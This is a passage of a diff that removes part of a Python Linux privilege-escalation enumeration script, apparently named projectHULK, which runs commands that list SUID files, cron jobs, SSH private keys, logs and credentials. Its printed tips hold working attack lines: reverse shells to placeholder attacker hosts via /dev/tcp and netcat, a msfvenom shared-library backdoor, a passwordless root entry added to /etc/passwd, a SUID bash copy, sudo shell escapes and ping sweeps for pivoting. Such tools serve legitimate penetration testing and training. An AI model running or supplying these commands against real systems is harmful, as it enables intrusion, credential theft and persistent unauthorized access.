-os.system ('sestatus 2>/dev/null')
-print("\n\n\033[01;31m\t\tEnumeration on progress ╔══════════════════......................(20%)..........................................\033[0m\n")
-time.sleep(5)
-print("\t\033[01;31m ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m")
-print("\t\033[01;31m  ══════════════════════════════════════════════════════════════[ System Date/Time ]══════════════════════════════════════════════════════════════ \033[0m")
-print("\t\033[01;31m ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m")
-print("\n")
-time.sleep(1)
-print("\n\033[0;37;44m[+] Up Time:\033[0m")
-os.system("uptime | sed -E 's/^[^,]*up *//; s/, *[[:digit:]]* users.*//; s/min/minutes/; s/([[:digit:]]+):0?([[:digit:]]+)/\1 hours, \2 minutes/'")
-print("\n\033[0;37;44m[+] System Date:\033[0m")
-os.system ('date 2>/dev/null')
-print("\n\033[0;37;44m[+] CPU Information:\033[0m")
-os.system ('lscpu')
-print("\n\033[0;37;44m[+] System Timer List:\033[0m")
-os.system ('systemctl list-timers --all')
-print("\n")
-print("\t\033[01;31m ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m")
-print("\t\033[01;31m  ════════════════════════════════════════════════════════════════[ System SUID ]═════════════════════════════════════════════════════════════════ \033[0m")
-print("\t\033[01;31m ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m")
-print("\n")
-time.sleep(1)
-print("\n\033[0;37;44m[+] What is SUID/GUID?\033[0m")
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║SUID (Set User ID) and SGIDs (Set Group ID) executables are those that execute║")
-print("\t  ║with the permission of the owner (SUID) or group (SGID). You can identify SUID║")
-print("\t  ║and SGIDs by a representative 's' in the execute permission field the file:   ║")
-print("\t  ║-rwsr-sr-x can often be exploit d to gain root privilege.                     ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Find capability files:\033[0m")
-os.system ("getcap -r / 2>/dev/null")
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Capability files are different from system to another system. Googling them my║")
-print("\t  ║revile a way of how to exploit them.                                          ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Capability with setui+ep:\033[0m")
-os.system ("getcap -r / 2>/dev/null | grep cap_setuid+ep")
-print("\n\033[0;37;44m[+] Built-in Binaries:\033[0m")
-print("\t  /usr/sbin/pppd                    |  /usr/sbin/exim4")
-print("\t  /usr/bin/ntfs-3g                  |  /usr/bin/chsh")
-print("\t  /usr/bin/su                       |  /usr/bin/chfn")
-print("\t  /usr/bin/mount                    |  /usr/bin/sudo")
-print("\t  /usr/bin/umount                   |  /usr/bin/pkexec")
-print("\t  /usr/bin/passwd                   |  /usr/bin/newgrp")
-print("\t  /usr/bin/gpasswd                  |  /usr/bin/fusermount")
-print("\t  /usr/sbin/mount.nfs               |  /usr/sbin/mount.cifs")
-print("\t  /usr/lib/xorg/Xorg.wrap           |  /usr/lib/openssh/ssh-keysign")
-print("\t  /usr/lib/chromium/chrome-sandbox  |  /usr/libexec/polkit-agent-helper-1")
-print("\t  /usr/bin/vmware-user-suid-wrapper |  /usr/lib/dbus-1.0/dbus-daemon-launch-helper")
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Most linux system have these Binaries, and they are built-in, no escalation   ║")
-print("\t  ║is done by them unless file permission has been change.                       ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Finding System SUID:\033[0m")
-os.system("find / -perm -u=s 2>/dev/null | xargs ls -la --color=always")
-print("\n\033[0;37;44m[+] SUID not built-in (Supper Interesting :D)\033[0m")
-os.system("find / -perm -u=s 2>/dev/null | xargs ls -la --color=always | grep -v 'pppd' | grep -v 'exim4' | grep -v 'ntfs-3g' | grep -v 'chsh' | grep -v 'su' | grep -v 'chfn' | grep -v 'mount' | grep -v 'sudo' | grep -v 'umount' | grep -v 'pkexec' | grep -v 'passwd' | grep -v 'newgrp' | grep -v 'gpasswd' | grep -v 'fusermount' | grep -v 'mount.nfs' | grep -v 'mount.cifs' | grep -v 'Xorg.wrap' | grep -v 'ssh-keysign' | grep -v 'chrome-sandbox' | grep -v 'polkit-agent-helper-1' | grep -v 'vmware-user-suid-wrapper' | grep -v 'dbus-daemon-launch-helper'")
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║When extra bit “4” is set to user(Owner) it becomes SUID (Set user ID):       ║")
-print("\t  ║-rw\033[01;31mx\033[0m     -rwx     -rwx                                                        ║")
-print("\t  ║SUID                                                                          ║")
-print("\t  ║-rw\033[01;31ms\033[0m                                                                          ║")
-print("\t  ║Visite:                                                                       ║")
-print("\t  ║https://gtfobins.github.io/                                                   ║")
-print("\t  ║https://mil0.io/linux-privesc/                                                ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Finding System GUID (execute as the group):\033[0m")
-os.system ('find / -perm -g=s -type f 2>/dev/null | xargs ls -la --color=always')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║When bit “2” is set to group it becomes SGID (Set Group ID):                  ║")
-print("\t  ║-rwx     -rw\033[01;31mx\033[0m     -rwx                                                        ║")
-print("\t  ║         SGID                                                                 ║")
-print("\t  ║         -rw\033[01;31ms\033[0m                                                                 ║")
-print("\t  ║Visite:                                                                       ║")
-print("\t  ║https://gtfobins.github.io/                                                   ║")
-print("\t  ║https://mil0.io/linux-privesc/                                                ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Find sticky-bit binaries:\033[0m")
-os.system ('find / -type d -perm -1000 -exec ls -ld --color=always {} \; 2>/dev/null')
-print("\n\033[0;37;44m[+] World writable scripts invoked as root:\033[0m")
-print("\n\033[0;37;41mRun this command manually: find / -writable -type f 2>/dev/null | xargs ls -la\033[0m")
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║If you find a script that is owned by root but is writable by anyone, you can  ║")
-print("\t  ║add your own malicious code into it and it will escalate your privileges when  ║")
-print("\t  ║the script runs as root                                                        ║")
-print("\t  ║\033[01;31mexploit :\033[0m                                                                      ║")
-print("\t  ║    \033[01;31mbash: echo 'bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1' >> file\033[0m║")
-print("\t  ║    \033[01;31mnetcat: echo 'nc <attacker_IP> <attacker_PORT> -e /bin/sh' >> file \033[0m        ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] World writable directories:\033[0m")
-os.system ('find / -type d \( -perm -g+w -o -perm -o+w \) -exec ls -lad --color=always {} \; 2>/dev/null')
-print("\n\033[0;37;44m[+] writable config files:\033[0m")
-os.system ('find /etc/ -writable -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null')
-print("\n\033[0;37;44m[+] How Files Can Be Upload/Download:\033[0m")
-os.system ('which wget nc netcat socat python python2 python3 ftp tftp ssh smb | xargs ls -la --color=always')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Some of them my have file misconfiguration and my lead to user escalation.    ║")
-print("\t  ║File Transfer Cheatsheet: Windows and Linux                                   ║")
-print("\t  ║https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/    ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Unexpected commands allows you to read and/or write files or even execute command:\033[0m")
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print('\t  ║sudo awk "BEGIN {system("/bin/sh")}"                                          ║')
-print("\t  ║sudo find /etc -exec sh -i \;                                                 ║")
-print("\t  ║sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh                          ║")
-print("\t  ║sudo tar c a.tar -I ./runme.sh a                                              ║")
-print("\t  ║ftp>!/bin/sh                                                                  ║")
-print("\t  ║less>! <shell_comand>                                                         ║")
-print("\t  ║                                Give it a try                                 ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Profiles files:\033[0m")
-os.system ('ls -la /etc/profile /etc/profile.d/')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║The file /etc/profile and the files under /etc/profile.d/ are scripts that are║")
-print("\t  ║executed when a user run a new shell. Therefore, if you can write or modify   ║")
-print("\t  ║any of the files, you can escalate privilege.                                 ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Is the .bashrc file writable?\033[0m")
-os.system ('ls -la /home/*/.bashrc; locate .bashrc | xargs ls -la --color=always; find / -name .bashrc -xdev 2>/dev/null | xargs ls -la --color=always')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║If so, malicious commands can be written to it and will be executed when the  ║")
-print("\t  ║user/root logs in.                                                            ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\n\033[01;31m\t\tEnumeration on progress ╔════════════════════════════════════════(50%)..........................................\033[0m\n")
-time.sleep(5)
-print("\t\033[01;31m ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m")
-print("\t\033[01;31m  ═════════════════════════════════════════════════════════[ System Process and Services ]════════════════════════════════════════════════════════ \033[0m")
-print("\t\033[01;31m ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m")
-print("\n")
-time.sleep(1)
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Have a look to what processes are being executed and check if any process has ║")
-print("\t  ║more privileges than it should. You can also use a tool called psyp.          ║")
-print("\t  ║https://github.com/DominicBreuker/pspy                                        ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Running Proccess on the system:\033[0m")
-os.system ('ps aux')
-print("\n\033[0;37;44m[+] Running Proccess as root:\033[0m")
-os.system ('ps aux | grep --color=always root')
-print("\n\033[0;37;44m[+] Running Proccess as current user:\033[0m")
-os.system ('ps aux | grep --color=always $USER')
-print("\n\033[0;37;44m[+] Process binaries and associated permissions:\033[0m")
-os.system ("ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null | awk '!x[$0]++' 2>/dev/null")
-print("\n\033[0;37;44m[+] Are service config files readable/wreitable by current user:\033[0m")
-os.system ("find /etc/init.d/ -uid 0 -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null")
-print("\n\033[0;37;44m[+] Shared object libraries (GOOD FOR BACKDOOR):\033[0m")
-os.system ("ldd /usr/local/bin/program 2>/dev/null")
-print("\n\033[0;37;44m[+] Is the executable compiled with RPATH or RUNPATH (GOOD FOR BACKDOOR):\033[0m")
-os.system ('objdump -x /usr/local/bin/program 2>/dev/null | grep -i "RPATH\|RUNPATH"')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║If any executable is found, create the backdoor using any payload you wich    ║")
-print("\t  ║using the same file found.                                                    ║")
-print("\t  ║For Example:                                                                  ║")
-print("\t  ║Payload using msfvenome:                                                      ║")
-print("\t  ║   msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<attacker IP>         ║")
-print("\t  ║   LPORT=<attacker LPORT> -f elf-so -o FILENAME.so                            ║")
-print("\t  ║Then send the file to the same directory, configure a Metasploit listener with║")
-print("\t  ║the same payloadlunch and wait for the program to be launched by a user with  ║")
-print("\t  ║elevated privileges.                                                          ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n")
-print("\t\033[01;31m ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m")
-print("\t\033[01;31m  ═════════════════════════════════════════════════════════[ System Path Scheduled Tasks ]════════════════════════════════════════════════════════ \033[0m")
-print("\t\033[01;31m ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m")
-print("\n")
-time.sleep(1)
-print("\n\033[0;37;44m[+] Current User Crontab:\033[0m")
-os.system ('crontab -l')
-print("\n\033[0;37;44m[+] Find World-Writable Cron jobs:\033[0m")
-os.system ("find /etc/cron* -type f -perm -o+w -exec ls -l {} \;")
-print("\n\033[0;37;44m[+] Other User Crontab [It may need root]:\033[0m")
-os.system ('cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║If you have the root/user password, try to run the command manually:          ║")
-print('\t  ║cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null             ║')
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Scheduled Jobs\033[0m")
-os.system ('cat /etc/crontab')
-print("\n\033[0;37;41mIf the File is Writable\033[0m")
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║If the file is running by root, & writable to anyone, the attacker my replace the content of the file.    ║")
-print("\t  ║\033[01;31mexploit :\033[0m                                                                                                 ║")
-print("\t  ║    \033[01;31mecho '/bin/sh' >> file\033[0m                                                                                ║")
-print("\t  ║    \033[01;31mecho '/bin/bash' >> file \033[0m                                                                             ║")
-print("\t  ║    \033[01;31mecho 'bash -i >& /dev/tcp/a.a.a.a/4242 0>&1' >> file\033[0m                                                  ║")
-print("\t  ║    \033[01;31mecho 'm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 443 >/tmp/f' >> file\033[0m               ║")
-print("\t  ║    \033[01;31mecho 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> file\033[0m                                             ║")
-print("\t  ║    \033[01;31mecho 'echo root::0:0:root:/root:/bin/bash >> /etc/passwd' >> file\033[0m                                     ║")
-print("\t  ║\033[01;31mYou can use any Reverse Shell payload from payloadallthethings in GitHub\033[0m                                  ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n")
-print("\t\033[01;31m ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m")
-print("\t\033[01;31m  ═════════════════════════════════════════════════════════[ Communications & Networking ]════════════════════════════════════════════════════════ \033[0m")
-print("\t\033[01;31m ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m")
-print("\n")
-time.sleep(1)
-print("\n\033[0;37;44m[+] Basic Network Details:\033[0m")
-os.system ('ifconfig | grep -v "ether\|loop\|TX\|RX"')
-print("\n\033[0;37;44m[+] Default Gatway:\033[0m")
-os.system ('route 2>/dev/null')
-print("\n\033[0;37;44m[+] Full Network Details:\033[0m")
-os.system ('ifconfig')
-print("\n\033[0;37;44m[+] Firewall Rulls:\033[0m")
-os.system ('iptables -nvL 2>/dev/null')
-print("\n\033[0;37;44m[+] Open Ports:\033[0m")
-os.system ('netstat -tulpna')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Are there any open ports on localhost we did not see when we were doing nmap? ║")
-print("\t  ║This might need tunneling or connecting to it locally. If nothing is displayed║")
-print("\t  ║run the command manually: netstat -tulpna                                     ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Network Route & Neighbours:\033[0m")
-os.system ('route; ip n')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Want to know how many hops are between our compromised machine, and other     ║")
-print("\t  ║network segments, do the following manually:                                  ║")
-print("\t  ║traceroute –n <ip address>                                                    ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] ARP Cashe:\033[0m")
-os.system ('arp; arp -en | grep -v Address')
-print("\n\033[0;37;44m[+] Pivoting:\033[0m")
-print("\t  ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Try to scan the Host network and see if there is any other host are online, use any of:                             ║")
-print('\t  ║    for ip in $(seq 1 255); do ping -c 1 v.v.v.$ip | grep  bytes from"; done                                        ║')
-print("\t  ║    for i in {1..255}; do ping -c 1 v.v.v.$i | grep 'bytes from' ; done                                             ║")
-print('\t  ║    for i in {1..255} ;do (ping v.v.v.$i -c 1 -w 5  >/dev/null && echo "v.v.v.$i Host Is Alive") ; done             ║')
-print("\t  ║We won't be able to access those machine, therefor, will have to do tunneling from the current machine to them.     ║")
-print("\t  ║Read More:                                                                                                          ║")
-print("\t  ║https://nullsweep.com/pivot-cheatsheet-for-pentesters/                                                              ║")
-print("\t  ║https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html                                                  ║")
-print("\t  ║https://ivanitlearning.wordpress.com/2019/03/08/client-side-exploitation-windows-pivoting-w-o-metasploit/           ║")
-print("\t  ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Hosts File:\033[0m")
-os.system ('cat /etc/hosts')
-print("\n\033[0;37;44m[+] DNS Server:\033[0m")
-os.system ('cat /etc/resolv.conf | grep nameserver')
-print("\n\033[0;37;44m[+] Outbound port connectivity:\033[0m")
-os.system ('nmap -sT -p4444-4450 portquiz.net 2>/dev/null')
-print( "\t  ╔═══════════════════════════════════════════════════════════════════════════════╗")
-print( "\t  ║Knowing this information will come in handy if and when we need to establish   ║")
-print( "\t  ║outbound connections to other systems we control for the purpose of maintaining║")
-print( "\t  ║access or exfiltrating data.                                                   ║")
-print( "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\n\033[01;31m\t\tEnumeration on progress ╔════════════════════════════════════════(80%)═════════════════.........................\033[0m\n")
-time.sleep(5)
-print("\t\033[01;31m ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m")
-print("\t\033[01;31m  ═══════════════════════════════════════════════════════════════[ Finding SSH Keys ]═════════════════════════════════════════════════════════════ \033[0m")
-print("\t\033[01;31m ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m")
-print("\n")
-time.sleep(1)
-print("\n\033[0;37;44m[+] SSH is configured for Public Key Authentication:\033[0m")
-os.system ('cat /etc/ssh/sshd_config | grep "PubkeyAuthentication" --color=always')
-print("\n\033[0;37;44m[+] Identify any existing public or private keys:\033[0m")
-os.system ('ls -la /$USER /etc/ssh /home/$USER/.ssh/ --color=always 2>/dev/null; cat /home/$USER/.ssh/id_rsa 2>/dev/null; cat /home/$USER/.ssh/id_dsa 2>/dev/null')
-print("\n\033[0;37;41mExploiting Misconfigured SSH Keys\033[0m")
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Secure Shell (SSH) is a cryptographic network protocol which allows users to securely      ║")
-print("\t  ║perform a number of network services, such as remote authentication or file transfer over  ║")
-print("\t  ║an unsecured network. exploit :                                                            ║")
-print("\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/ ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] id_rsa:\033[0m")
-os.system("find / -name id_rsa 2>/dev/null")
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║If anyone have access to any user's id_rsa, he can login to the system using that key.     ║")
-print("\t  ║\033[01;31mexploit :\033[0m                                                                                  ║")
-print("\t  ║    \033[01;31mscp -P 22 username@v.v.v.v:/path/to/victid_rsaim /path/to/attacker\033[0m                     ║")
-print("\t  ║    \033[01;31mchmod 0600 id_rsa\033[0m                                                                      ║")
-print("\t  ║    \033[01;31mssh -p 22 user-of-id_rsa@v.v.v.v -i id_rsa\033[0m                                             ║")
-print("\t  ║Read More:                                                                                 ║")
-print("\t  ║    https://matt.might.net/articles/ssh-hacks/                                             ║")
-print("\t  ║    https://book.hacktricks.xyz/pentesting/pentesting-ssh                                  ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] id_dsa:\033[0m")
-os.system("find / -name id_dsa 2>/dev/null")
-print("\n\033[0;37;44m[+] authorized_keys:\033[0m")
-os.system("find / -name authorized_keys 2>/dev/null")
-print("\n\033[0;37;44m[+] ssh_config File:\033[0m")
-os.system("ls -la /etc/ssh/ssh_config --color=always")
-print("\n\033[0;37;44m[+] Reading ssh_config File:\033[0m")
-os.system("cat /etc/ssh/ssh_config")
-print("\n\033[0;37;44m[+] sshd_config File:\033[0m")
-os.system("ls -la /usr/share/openssh/sshd_config --color=always 2>/dev/null")
-print("\n\033[0;37;44m[+] Reading sshd_config File:\033[0m")
-os.system("cat /usr/share/openssh/sshd_config 2>/dev/null")
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Read more about sshd_config file:                                                              ║")
-print("\t  ║  https://www.ssh.com/academy/ssh/sshd_config                                                  ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] hosts.denied:\033[0m")
-os.system("ls -la /etc/hosts.denied --color=always 2>/dev/null")
-print("\n\033[0;37;44m[+] Reading hosts.denied:\033[0m")
-os.system("cat /etc/hosts.denied 2>/dev/null")
-print("\n\033[0;37;44m[+] hosts.allow:\033[0m")
-os.system("ls -la /etc/hosts.allow --color=always 2>/dev/null")
-print("\n\033[0;37;44m[+] Reading hosts.allow:\033[0m")
-os.system("cat /etc/hosts.allow 2>/dev/null")
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║When a client attempts to connect to a network service on a remote system, these files are     ║")
-print("\t  ║used to determine whether client access is allowed or denied. Use /etc/hosts.allow and         ║")
-print("\t  ║/etc/hosts.deny to define rules that selectively allow or deny clients access to server        ║")
-print("\t  ║daemons on local system.                                                                       ║")
-print("\t  ║Read More:                                                                                     ║")
-print("\t  ║https://www.thegeekdiary.com/understanding-tcp-wrappers-in-linux/                              ║")
-print("\t  ║http://www.freekb.net/Article?id=1091                                                          ║")
-print("\t  ║https://www.smartdomotik.com/2015/02/09/using-etchosts-allow-and-etchosts-deny-to-secure-unix/ ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Any active SSH session:\033[0m")
-os.system("ps aux | grep sshd")
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║If any session is found, the session can be hijacked. Read more about SSH session hijacking:   ║")
-print("\t  ║  https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/                    ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════════════════════╝")
-print("\n")
-print("\t\033[01;31m ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m")
-print("\t\033[01;31m  ═════════════════════════════════════════════════════════════════[ Extra Creds ]════════════════════════════════════════════════════════════════ \033[0m")
-print("\t\033[01;31m ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m")
-print("\n")
-time.sleep(1)
-print("\n\033[0;37;44m[+] Mail File:\033[0m")
-os.system ('ls -la /var/mail/ --color=always 2>/dev/null')
-print("\n\033[0;37;44m[+] List Root Directory:\033[0m")
-os.system ('ls -la /root/ 2>/dev/null --color=always')
-print("\n\033[0;37;44m[+] Home Directory:\033[0m")
-os.system ('ls -la /home/ --color=always 2>/dev/null')
-print("\n\033[0;37;44m[+] Tmp Directory:\033[0m")
-os.system ('ls -la /tmp --color=always 2>/dev/null')
-print("\n\033[0;37;44m[+] Backup Directory:\033[0m")
-os.system ("ls -la /var/backups 2>/dev/null && find / -type f  -name *backup* -o -name *.bak -o -name *.bak* -o -name *.bck -o -name *.bk -o -name *.old*  2>/dev/null  | xargs ls -la 2>/dev/null --color=always | grep backup")
-print("\n\033[0;37;44m[+] Apache2 Version:\033[0m")
-os.system ('apache2 -v 2>/dev/null; httpd -v 2>/dev/null')
-print("\n\033[0;37;44m[+] Apache User:\033[0m")
-os.system ("grep --color=always -i 'user\|group' /etc/apache2/envvars 2>/dev/null --color=always")
-print("\n\033[0;37;44m[+] Apache Config File:\033[0m")
-os.system ('cat /var/apache2/config.inc 2>/dev/null')
-print("\n\033[0;37;44m[+] Check readability of apache/nginx access log:\033[0m")
-os.system ('cat /var/log/apache/access.log 2>/dev/null | grep -i "user\|pass" 2>/dev/null')
-os.system ('cat /var/log/apache2/access.log 2>/dev/null')
-os.system ('cat /var/log/nginx/access.log 2>/dev/null')
-print("\n\033[0;37;44m[+] MySQL Version:\033[0m")
-os.system ('mysql --version 2>/dev/null --color=always')
-print("\n\033[0;37;44m[+] MySQL:\033[0m")
-os.system ('ls -la /var/lib/mysql 2>/dev/null --color=always')
-print("\n\033[0;37;44m[+] Log File:\033[0m")
-os.system ('ls -la /var/log 2>/dev/null --color=always')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Do the following and see if there is any password:-                               ║")
-print("\t  ║  grep -r passw . 2>/dev/null                                                     ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] .config file in /var/www:\033[0m")
-os.system ('ls -la /var/www --color=always 2>/dev/null')
-print("\n\033[0;37;44m[+] Spool File:\033[0m")
-os.system ('ls -la /var/spool 2>/dev/null --color=always')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Contains data which is awaiting some kind of later processing. Data in /var/spool ║")
-print("\t  ║represents work to be done in the future (by a program, user, or administrator);  ║")
-print("\t  ║often data is deleted after it has been processed.                                ║")
-print("\t  ║Read More:                                                                        ║")
-print("\t  ║https://refspecs.linuxfoundation.org/FHS_3.0/fhs/ch05s14.html                     ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] PostgreSQL Version:\033[0m")
-os.system ('psql -V 2>/dev/null')
-print("\n\033[0;37;44m[+] PostgreSQL:\033[0m")
-os.system ('ls -la /var/lib/pgsql 2>/dev/null')
-print("\n\033[0;37;44m[+] System files dont belong to root:\033[0m")
-os.system ('find /lib/systemd/ \! -uid 0 -type f 2>/dev/null | xargs -r ls -la 2>/dev/null --color=always')
-print("\n\033[0;37;44m[+] Tools/Languages Installed:\033[0m")
-os.system ('which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null | xargs ls -la')
-print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║Some of the tools have an exploit, do compgen -c to list all of the tools.    ║")
-print("\t  ║Exploit: https://gtfobins.github.io/                                          ║")
-print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Read roots mail:\033[0m")
-os.system ('head /var/mail/root 2>/dev/null')
-print("\n\033[0;37;44m[+] Config Files:\033[0m")
-os.system ("find / -name *.config -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always")
-print("\n\033[0;37;44m[+] Bash Files:\033[0m")
-os.system ('find / -name *.sh -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/firmware-mod-kit/"')
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║projectHULK search has excluded the following directory:-                      ║")
-print("\t  ║  /usr/*       |  /opt/firmware-mod-kit/*                                      ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Python Files:\033[0m")
-os.system ('find / -name *.py -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/firmware-mod-kit/\|/opt/xplico/"')
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║projectHULK search has excluded the following directory:-                      ║")
-print("\t  ║  /usr/*       |  /opt/firmware-mod-kit/*       |  /opt/xplico/*               ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] PHP Files:\033[0m")
-os.system ('find / -name *.php -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/share\|/opt/xplico"')
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║projectHULK search has excluded the following directory:-                      ║")
-print("\t  ║  /usr/*       |  /opt/xplico/*                                                ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] Text Files:\033[0m")
-os.system ('find / -name *.txt 2>/dev/null | grep -v "/usr/\|/opt/\|/etc/\|/root/.*" | xargs ls -la --color=always 2>/dev/null')
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║projectHULK search has excluded the following directory:-                      ║")
-print("\t  ║  /usr/*       |  /opt/       |  /etc/       |  /root/.*                       ║")
-print("\t  ╚═══════════════════════════════════════════════════════════════════════════════╝")
-print("\n\033[0;37;44m[+] HTML Files:\033[0m")
-os.system ('find / -name *.html 2>/dev/null | grep -v "/usr/" | xargs ls -la --color=always 2>/dev/null')
-print("\t  ╔═══════════════════════════════════════════════════════════════════════════════╗")
-print("\t  ║projectHULK search has excluded the following directory:-                      ║")
-print("\t  ║  /usr/*       |  /opt/       |  /etc/       |  /root/.*                       ║")
